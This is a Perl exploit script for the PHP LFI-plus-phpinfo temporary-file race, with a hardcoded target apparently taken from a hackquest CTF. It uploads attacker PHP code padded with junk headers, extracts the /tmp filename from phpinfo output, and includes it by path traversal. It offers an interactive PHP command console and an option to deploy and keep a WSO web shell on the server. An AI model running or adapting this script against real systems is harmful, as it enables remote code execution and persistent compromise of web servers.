#!/usr/bin/perl -w
# perl lfi.pl http://localhost/phpinfo.php  http://localhost/test.php?e=../../../../../etc/passwd
use IO::Socket;
use LWP::Simple;
# GLOBAL SETTINGS #############################################################################
$use_shell=0;# use web-shell, 1 - yes, 0 - no
$shell_file="wso2.txt"; # web-shell file
$phpcode = '';
$save_to_file = 0; # 1 - save to file z_host.txt, 0- no
$console = 1; # 1 - Work in terminal, 0 - no
$keep_tmp_file = 1; #1 - Keeping file $tmpfile in tmp, use it as long as you need it, 0 - No
$rcvbuf = 1024; # increase if script is running too slow. will be automatically doubled
$bigz = 3000; # 8000 - long line to create bottlenecks
$junkheaders = 30; # 1-90
$junkfiles = 40; #10 ~ 4Mb of overhead
$junkfilename = '>' x 100000;
###############################################################################################
if($use_shell==1){ 
  open(FILE, $shell_file);
  @file = <FILE>;
  close(FILE);
  $phpcode = join('', @file);
  $console=0;
  $keep_tmp_file=1;
  $phpcode_tmp=$phpcode;
  $save_to_file=0;
}else{
$phpcode_tmp=$phpcode;
}
$host = "";$path = ""; $flag = 0;
if($ARGV[0] =~ m#http://(.+?)(/.+)#) {$host = $1;$path = $2} else { die "Can't extract host\n"}; 
get_tmp();
sub get_tmp {
   $|=1;
   START:
   if ($console ==1 && $flag == 1){
      print "\nType your PHP CODE or EXIT:\n============================================\n";
      $phpcode = <STDIN>;
      chomp $phpcode;
      if ($phpcode eq "exit" || $phpcode eq "EXIT") { print "\nby-by :)\n";exit}
   }
   if ($save_to_file == 1) {open( FILE, ">>" . "z_" .$host . ".txt" )} 
   print "\nGenerating huge headers\t\t";
   my $headers = 
"POST $path HTTP/1.0
Host: $host
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b8) Gecko/20100101 Firefox/4.0b8
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7
z:".("Z" x $bigz)."\n";
   for(my $i=0; $i<$junkheaders; $i++) {
      $headers .= "z$i: $i\n";
   }
   $headers .= "Content-Type: multipart/form-data; boundary=---------------------------59502863519624080131137623865
Content-Length: ";
   my $content=
'-----------------------------59502863519624080131137623865
Content-Disposition: form-data; name="tfile"; filename="test.sh"
Content-Type: text/html

'.$phpcode_tmp.'
-----------------------------59502863519624080131137623865--
';
   for (my $i=0; $i<$junkfiles; $i++) {
       $content .= '-----------------------------59502863519624080131137623865
Content-Disposition: form-data; name="ffile'.$i.'"; filename="'.$i.$junkfilename.'"
Content-Type: text/html

no

-----------------------------59502863519624080131137623865--
';}
   $headers .= length($content)."\n\n".$content;
   print "[headers ready]\n";
   my $remote = IO::Socket::INET->new( Proto     => "tcp",
	                                 PeerAddr  => $host,
	                                 PeerPort  => 80,
	                               );
   setsockopt($remote, SOL_SOCKET, SO_RCVBUF,pack("I",$rcvbuf));
   sleep(1);
   print "Setting buffer size\t\t[".unpack("I",getsockopt($remote, SOL_SOCKET, SO_RCVBUF))."]\n";
   unless ($remote) { die "cannot connect to http daemon on $host" }
   $remote->autoflush(1);
   print "Sending request\t\t\t";
   print $remote $headers;
   print "[request sent]\n";
   my $line = <$remote>;
   print $line;	
   print "Reading";
   while ( $line = <$remote> ) { 
      print ".";
      if ($line =~ m#tmp_name].+(/tmp/php.+)$#) {
	  my $tmpfile = $1;
	  print "\nGot filename: $tmpfile\n";
	  print "Including...\n";

	  		$tmpfile =~ s#/+#%252f#g;
          $inc = "http://php.hackquest.phdays.com:88/..%252f..%252f..%252f..%252f..%252f..$tmpfile.html"; #path to /etc/passwd 

          #$inc =~ s#/#%252f#g;

          print "$inc\n";

          $flag = 1;  
          my $result = get($inc);
          if($use_shell!=1){ 
             if($result =~ m/ussr(.*?)ussr/imgs){
                 print "\n\n================= PHP CODE: =================\n$phpcode\n"; 
                 print "\n\n================= RESULTS: ==================\n\n$1\n"; 
                 print "\n\n=============================================\n\n";
                 if($save_to_file==1){print FILE $1 . "\n"}
             } else {
                 print "\n\n================= CHECK PHP CODE (maybe error in code or some functions are disabled [system for example]): =================\n$phpcode\n"; 
                 print "\n No results, exploit failed, sorry\n\n";
             }
          } else {
             print "\nYour shell in \n\n===>  $inc\n\n don't forget to delete it after all\n";  
          }
          if ($keep_tmp_file == 1) { 
                 print "\nKeeping file $tmpfile in tmp, use it as long as you need it\n";
     	         while ($remote) {print ".\r";sleep 5};
          }  
   	  close $remote;
      }
   }
   if ($save_to_file == 1) {close(FILE)}
   $flag = 1;
   if ($console ==1 && $flag == 1){ 
      goto START;
   } else {exit}
}